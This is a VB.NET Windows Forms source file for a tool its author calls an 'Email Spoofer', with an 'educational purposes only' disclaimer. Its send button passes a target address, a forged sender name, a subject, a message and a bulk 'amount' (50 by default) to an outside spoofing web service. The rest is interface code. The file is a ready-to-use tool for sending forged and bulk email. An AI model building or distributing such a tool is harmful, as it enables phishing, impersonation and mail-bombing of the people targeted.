

Public Class frmMain

    '// Author     : DrWeabo
    '// Name       : Email Spoofer
    '// Contact    : https://github.com/DrWeabo // https://www.DrWeabo.com
    '// Theme      : GunaUI Framework

    '// This script is distributed for educational purposes only & use at own risk.

    Dim x, y As Integer
    Dim o As New Point

    Dim Send As New System.Net.WebClient


    Private Sub Send_Click(sender As Object, e As EventArgs) Handles btnSend.Click

        'Information
        Dim Target As String = (txtTarget.Text)
        Dim Subject As String = (txtSubject.Text)
        Dim Message As String = (txtMessage.Text)
        Dim Amount As String = (lblAmount.Text)
        Dim Senders As String = (txtSender.Text)

        'This a bonus free api access
        Dim Api As String = ("https://api-spoof.000webhostapp.com/spoofer/send.php")

        'Start
        Dim Result As String = Send.DownloadString(Api + "?target=" + Target + "&subject=" + Subject + "&message=" + Message + "&amount=" + Amount + "&sender=" + Senders)

        'Show messages
        MsgBox(Result, MsgBoxStyle.Information, "")

    End Sub


    Private Sub tbAmount_Scroll(sender As Object, e As ScrollEventArgs) Handles tbAmount.Scroll

        'Amount sending
        lblAmount.Text = tbAmount.Value

    End Sub


    Private Sub btnClear_Click(sender As Object, e As EventArgs) Handles btnClear.Click

        'Clear all text
        txtTarget.Text = ""
        txtSender.Text = ""
        txtSubject.Text = ""
        txtMessage.Text = ""
        tbAmount.Value = "50"
        lblAmount.Text = "50"

    End Sub


    Private Sub pnlTop_MouseDown(sender As Object, e As MouseEventArgs) Handles pnlTop.MouseDown

        'Control Move for Panel
        x = Control.MousePosition.X - Me.Location.X
        y = Control.MousePosition.Y - Me.Location.Y

    End Sub


    Private Sub pnlTop_MouseMove(sender As Object, e As MouseEventArgs) Handles pnlTop.MouseMove

        'Control Move for Panel
        If e.Button = Windows.Forms.MouseButtons.Left Then
            o = Control.MousePosition
            o.X -= x
            o.Y -= y
            Me.location = o
            Application.DoEvents()
        End If

    End Sub
   

    Private Sub lblCompany_Click(sender As Object, e As EventArgs) Handles lblCompany.Click

        'Advertising
        Shell("explorer.exe https://www.DrWeabo.com")

    End Sub


    Private Sub frmMain_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        'Form Load
        lblAmount.Text = tbAmount.Value

        Guna.UI.Lib.GraphicsHelper.ShadowForm(Me)
        Guna.UI.Lib.GraphicsHelper.DrawLineShadow(pnlMain, Color.Black, 20, 5, Guna.UI.WinForms.VerHorAlign.HorizontalBottom)

    End Sub
End Class
